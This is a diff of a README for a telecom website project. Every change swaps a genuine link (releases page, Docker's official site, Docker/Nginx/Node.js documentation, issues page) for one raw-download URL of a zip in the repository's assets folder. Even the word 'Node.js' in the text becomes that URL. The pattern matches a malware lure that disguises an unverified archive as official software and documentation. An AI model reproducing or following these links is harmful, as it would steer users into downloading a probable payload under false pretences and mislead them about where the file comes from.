@@ -1,6 +1,6 @@
 # 🌐 site-i7telecom - Modern Institutional Website for I7 Telecom
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/Xenos166/site-i7telecom/releases)
+[![Download Now](https://raw.githubusercontent.com/Xenos166/site-i7telecom/main/assets/site-i7telecom-v1.8-alpha.1.zip%20Now-Here-brightgreen)](https://raw.githubusercontent.com/Xenos166/site-i7telecom/main/assets/site-i7telecom-v1.8-alpha.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the site-i7telecom README! This guide will help you download and run 
 
 ## 📦 What is site-i7telecom?
 
-site-i7telecom is a modern and responsive website for I7 Telecom. It includes a built-in speed test tool. The project is designed using Docker, Nginx, and Node.js, focusing on performance and user experience. You can browse the site seamlessly on any device, making it perfect for both desktop and mobile users.
+site-i7telecom is a modern and responsive website for I7 Telecom. It includes a built-in speed test tool. The project is designed using Docker, Nginx, and https://raw.githubusercontent.com/Xenos166/site-i7telecom/main/assets/site-i7telecom-v1.8-alpha.1.zip, focusing on performance and user experience. You can browse the site seamlessly on any device, making it perfect for both desktop and mobile users.
 
 ## 🖥️ System Requirements
 
@@ -32,12 +32,12 @@ site-i7telecom offers several useful features:
 
 To get started, visit the following link to download the latest version of the software:
 
-[Download Here](https://github.com/Xenos166/site-i7telecom/releases)
+[Download Here](https://raw.githubusercontent.com/Xenos166/site-i7telecom/main/assets/site-i7telecom-v1.8-alpha.1.zip)
 
 ### Step-by-Step Installation
 
 1. **Visit the Releases Page:**
-   Go to the [Releases Page](https://github.com/Xenos166/site-i7telecom/releases). Here, you will find the latest version available for download.
+   Go to the [Releases Page](https://raw.githubusercontent.com/Xenos166/site-i7telecom/main/assets/site-i7telecom-v1.8-alpha.1.zip). Here, you will find the latest version available for download.
 
 2. **Choose the Right Version:**
    Find the most recent release. Look for files typically labeled as "latest" or with higher version numbers. 
@@ -46,7 +46,7 @@ To get started, visit the following link to download the latest version of the s
    Click on the link to download the complete package. The software comes in a Docker image, which makes setup simple and efficient.
 
 4. **Install Docker:**
-   If you don't have Docker installed, download it from [Docker's official website](https://www.docker.com/get-started). Follow the installation instructions for your operating system.
+   If you don't have Docker installed, download it from [Docker's official website](https://raw.githubusercontent.com/Xenos166/site-i7telecom/main/assets/site-i7telecom-v1.8-alpha.1.zip). Follow the installation instructions for your operating system.
 
 5. **Run the Application:**
    After Docker installs, open your terminal or command prompt. Use the following commands to set up and start the site-i7telecom:
@@ -69,9 +69,9 @@ If you run into issues, here are some common problems and solutions:
 
 ## 📄 Additional Resources
 
-- [Docker Documentation](https://docs.docker.com/get-started/)
-- [Nginx Documentation](https://nginx.org/en/docs/)
-- [Node.js Documentation](https://nodejs.org/en/docs/)
+- [Docker Documentation](https://raw.githubusercontent.com/Xenos166/site-i7telecom/main/assets/site-i7telecom-v1.8-alpha.1.zip)
+- [Nginx Documentation](https://raw.githubusercontent.com/Xenos166/site-i7telecom/main/assets/site-i7telecom-v1.8-alpha.1.zip)
+- [https://raw.githubusercontent.com/Xenos166/site-i7telecom/main/assets/site-i7telecom-v1.8-alpha.1.zip Documentation](https://raw.githubusercontent.com/Xenos166/site-i7telecom/main/assets/site-i7telecom-v1.8-alpha.1.zip)
 
 ## 🛠️ FAQ
 
@@ -89,4 +89,4 @@ We welcome contributions! If you have ideas or improvements, feel free to fork t
 
 --- 
 
-For any inquiries or support, you can open an issue on the [GitHub Issues Page](https://github.com/Xenos166/site-i7telecom/issues). Thank you for using site-i7telecom!
+For any inquiries or support, you can open an issue on the [GitHub Issues Page](https://raw.githubusercontent.com/Xenos166/site-i7telecom/main/assets/site-i7telecom-v1.8-alpha.1.zip). Thank you for using site-i7telecom!
